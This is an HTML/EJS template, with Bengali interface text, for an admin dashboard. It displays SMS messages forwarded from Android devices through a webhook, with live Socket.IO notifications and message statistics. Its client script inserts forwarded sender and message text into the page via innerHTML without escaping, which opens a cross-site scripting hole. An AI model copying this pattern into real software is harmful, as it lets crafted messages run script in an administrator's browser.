<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<title>SMS ম্যানেজমেন্ট - এডমিন প্যানেল</title>
<link rel="stylesheet" href="/style.css">
<script src="/socket.io/socket.io.js"></script>
<style>
.sms-stats {
    display: flex;
    justify-content: space-between;
    margin: 20px 0;
    flex-wrap: wrap;
}
.stat-card {
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
    padding: 20px;
    border-radius: 10px;
    text-align: center;
    min-width: 150px;
    margin: 5px;
}
.sms-container {
    max-height: 600px;
    overflow-y: auto;
    border: 1px solid #ddd;
    border-radius: 10px;
    padding: 10px;
    background: #f9f9f9;
}
.sms-item {
    background: white;
    margin: 10px 0;
    padding: 15px;
    border-radius: 8px;
    border-left: 4px solid #667eea;
    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    transition: transform 0.2s;
}
.sms-item:hover {
    transform: translateY(-2px);
}
.sms-item.new {
    border-left-color: #28a745;
    animation: newSmsAlert 2s ease-in-out;
}
@keyframes newSmsAlert {
    0% { background-color: #d4edda; }
    100% { background-color: white; }
}
.sms-header {
    display: flex;
    justify-content: space-between;
    margin-bottom: 10px;
    font-weight: bold;
}
.sms-from {
    color: #667eea;
}
.sms-time {
    color: #666;
    font-size: 12px;
}
.sms-message {
    background: #f8f9fa;
    padding: 10px;
    border-radius: 5px;
    font-family: monospace;
    margin: 5px 0;
}
.notification-area {
    position: fixed;
    top: 20px;
    right: 20px;
    z-index: 1000;
}
.notification {
    background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
    color: white;
    padding: 15px 20px;
    border-radius: 8px;
    margin-bottom: 10px;
    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
    animation: slideIn 0.5s ease-out;
    min-width: 300px;
}
@keyframes slideIn {
    from { transform: translateX(100%); opacity: 0; }
    to { transform: translateX(0); opacity: 1; }
}
.connection-status {
    padding: 10px;
    border-radius: 5px;
    margin: 10px 0;
    text-align: center;
    font-weight: bold;
}
.connected {
    background-color: #d4edda;
    color: #155724;
    border: 1px solid #c3e6cb;
}
.disconnected {
    background-color: #f8d7da;
    color: #721c24;
    border: 1px solid #f5c6cb;
}
.controls {
    display: flex;
    gap: 10px;
    margin: 20px 0;
    flex-wrap: wrap;
}
.btn-test {
    background: linear-gradient(135deg, #ffc107 0%, #ff8c00 100%);
    color: white;
}
.nav-menu {
    display: flex;
    justify-content: center;
    gap: 15px;
    margin: 20px 0;
    flex-wrap: wrap;
}
.nav-box {
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
    padding: 15px 25px;
    border-radius: 10px;
    text-decoration: none;
    font-weight: bold;
    transition: transform 0.3s;
    cursor: pointer;
}
.nav-box:hover {
    transform: translateY(-2px);
    color: white;
}
.nav-box.active {
    background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
}
</style>
</head>
<body>
<div class="container">
    <h2 style="text-align:center;color:#333;margin-bottom:30px;">SMS ফরওয়ার্ডিং ম্যানেজমেন্ট</h2>
    
    <!-- Navigation Menu -->
    <div class="nav-menu">
        <a href="/admin_panel" class="nav-box">ড্যাশবোর্ড</a>
        <a href="/admin/user_information" class="nav-box">ইউজার ইনফো</a>
        <a href="/admin/sms_management" class="nav-box active">SMS ম্যানেজমেন্ট</a>
        <a href="/admin_logout" class="nav-box">লগআউট</a>
    </div>

    <!-- Connection Status -->
    <div id="connectionStatus" class="connection-status disconnected">
        WebSocket সংযোগ স্থাপন করা হচ্ছে...
    </div>

    <!-- SMS Statistics -->
    <div class="sms-stats">
        <div class="stat-card">
            <h4>মোট SMS</h4>
            <p style="font-size:24px;margin:10px 0;"><%= stats.total %></p>
        </div>
        <div class="stat-card">
            <h4>আজকের SMS</h4>
            <p style="font-size:24px;margin:10px 0;"><%= stats.today %></p>
        </div>
        <div class="stat-card">
            <h4>এই সপ্তাহে</h4>
            <p style="font-size:24px;margin:10px 0;"><%= stats.thisWeek %></p>
        </div>
        <div class="stat-card">
            <h4>সংযুক্ত ক্লায়েন্ট</h4>
            <p style="font-size:24px;margin:10px 0;" id="connectedClients"><%= connectedClients %></p>
        </div>
    </div>

    <!-- Controls -->
    <div class="controls">
        <button onclick="testSMS()" class="btn btn-test">টেস্ট SMS পাঠান</button>
        <button onclick="clearSMS()" class="btn btn-secondary">SMS ক্লিয়ার করুন</button>
        <button onclick="refreshSMS()" class="btn">রিফ্রেশ করুন</button>
    </div>

    <!-- Real-time SMS Display -->
    <div>
        <h3 style="color:#667eea;margin:20px 0;">রিয়েল-টাইম SMS (<span id="smsCount"><%= smsMessages.length %></span>)</h3>
        <div id="smsContainer" class="sms-container">
            <% if (smsMessages.length === 0) { %>
                <div style="text-align:center;padding:50px;color:#666;">
                    <p>এখনো কোনো SMS পাওয়া যায়নি</p>
                    <p>আপনার Android ডিভাইস থেকে SMS ফরওয়ার্ড করুন</p>
                </div>
            <% } else { %>
                <% smsMessages.forEach(function(sms) { %>
                    <div class="sms-item">
                        <div class="sms-header">
                            <span class="sms-from">From: <%= sms.from %></span>
                            <span class="sms-time"><%= new Date(sms.receivedAt || sms.timestamp).toLocaleString('bn-BD') %></span>
                        </div>
                        <div class="sms-message"><%= sms.message %></div>
                        <div style="font-size:12px;color:#666;margin-top:5px;">
                            Device: <%= sms.deviceId %> | SIM: <%= sms.sim %>
                        </div>
                    </div>
                <% }); %>
            <% } %>
        </div>
    </div>

    <!-- Webhook Information -->
    <div style="margin-top:30px;padding:20px;background:#f8f9fa;border-radius:10px;">
        <h4 style="color:#667eea;">SMS Webhook তথ্য</h4>
        <p><strong>Webhook URL:</strong> <code id="webhookUrl">https://your-domain.com/api/sms/webhook</code></p>
        <p><strong>Method:</strong> POST</p>
        <p><strong>Content-Type:</strong> application/json</p>
        <button onclick="copyWebhookUrl()" class="btn btn-secondary">URL কপি করুন</button>
    </div>
</div>

<!-- Notification Area -->
<div id="notificationArea" class="notification-area"></div>

<script>
// Initialize Socket.IO connection
const socket = io();
let isConnected = false;

// DOM elements
const connectionStatus = document.getElementById('connectionStatus');
const smsContainer = document.getElementById('smsContainer');
const smsCount = document.getElementById('smsCount');
const connectedClients = document.getElementById('connectedClients');
const notificationArea = document.getElementById('notificationArea');

// Connect as admin
socket.emit('admin_connect', { isAdmin: true });

// Connection events
socket.on('connect', () => {
    isConnected = true;
    updateConnectionStatus();
    console.log('Connected to WebSocket server');
});

socket.on('disconnect', () => {
    isConnected = false;
    updateConnectionStatus();
    console.log('Disconnected from WebSocket server');
});

// SMS events
socket.on('new_sms_notification', (data) => {
    console.log('New SMS notification:', data);
    addNewSMS(data.sms);
    updateSMSCount(data.totalCount);
    showNotification(`নতুন SMS: ${data.sms.from}`, data.sms.message);
    playNotificationSound();
});

socket.on('sms_history', (data) => {
    console.log('SMS history received:', data);
    // History is already loaded from server, this is for newly connected admins
});

function updateConnectionStatus() {
    if (isConnected) {
        connectionStatus.textContent = 'রিয়েল-টাইম SMS নোটিফিকেশন সক্রিয়';
        connectionStatus.className = 'connection-status connected';
    } else {
        connectionStatus.textContent = 'WebSocket সংযোগ বিচ্ছিন্ন - পুনরায় সংযোগের চেষ্টা করা হচ্ছে...';
        connectionStatus.className = 'connection-status disconnected';
    }
}

function addNewSMS(sms) {
    const smsItem = document.createElement('div');
    smsItem.className = 'sms-item new';
    
    const receivedTime = new Date(sms.receivedAt || sms.timestamp);
    
    smsItem.innerHTML = `
        <div class="sms-header">
            <span class="sms-from">From: ${sms.from}</span>
            <span class="sms-time">${receivedTime.toLocaleString('bn-BD')}</span>
        </div>
        <div class="sms-message">${sms.message}</div>
        <div style="font-size:12px;color:#666;margin-top:5px;">
            Device: ${sms.deviceId} | SIM: ${sms.sim}
        </div>
    `;
    
    // Add to top of container
    const existingContent = smsContainer.innerHTML;
    if (existingContent.includes('এখনো কোনো SMS পাওয়া যায়নি')) {
        smsContainer.innerHTML = '';
    }
    smsContainer.insertBefore(smsItem, smsContainer.firstChild);
    
    // Remove 'new' class after animation
    setTimeout(() => {
        smsItem.classList.remove('new');
    }, 2000);
}

function updateSMSCount(count) {
    smsCount.textContent = count;
}

function showNotification(title, message) {
    const notification = document.createElement('div');
    notification.className = 'notification';
    notification.innerHTML = `
        <div style="font-weight:bold;margin-bottom:5px;">${title}</div>
        <div style="font-size:14px;">${message.substring(0, 100)}${message.length > 100 ? '...' : ''}</div>
    `;
    
    notificationArea.appendChild(notification);
    
    // Auto remove after 5 seconds
    setTimeout(() => {
        notification.remove();
    }, 5000);
}

function playNotificationSound() {
    // Create a simple beep sound
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();
        
        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);
        
        oscillator.frequency.value = 800;
        oscillator.type = 'sine';
        
        gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
        gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
        
        oscillator.start(audioContext.currentTime);
        oscillator.stop(audioContext.currentTime + 0.3);
    } catch (e) {
        console.log('Audio notification not supported');
    }
}

// Control functions
function testSMS() {
    fetch('/test/sms')
        .then(response => response.json())
        .then(data => {
            console.log('Test SMS response:', data);
            alert('টেস্ট SMS পাঠানো হয়েছে!');
        })
        .catch(error => {
            console.error('Test SMS error:', error);
            alert('টেস্ট SMS পাঠাতে সমস্যা হয়েছে!');
        });
}

function clearSMS() {
    if (confirm('সব SMS মুছে ফেলতে চান?')) {
        // This would need a backend endpoint to clear SMS
        alert('এই ফিচার শীঘ্রই আসছে');
    }
}

function refreshSMS() {
    location.reload();
}

function copyWebhookUrl() {
    const url = window.location.origin + '/api/sms/webhook';
    navigator.clipboard.writeText(url).then(() => {
        alert('Webhook URL কপি করা হয়েছে!');
        document.getElementById('webhookUrl').textContent = url;
    }).catch(() => {
        alert('Webhook URL: ' + url);
    });
}

// Update webhook URL on page load
document.addEventListener('DOMContentLoaded', () => {
    const webhookUrl = window.location.origin + '/api/sms/webhook';
    document.getElementById('webhookUrl').textContent = webhookUrl;
});

// Auto-scroll to latest SMS
function scrollToLatest() {
    smsContainer.scrollTop = 0;
}

// Call scroll function when new SMS arrives
socket.on('new_sms_notification', () => {
    setTimeout(scrollToLatest, 100);
});
</script>
</body>
</html>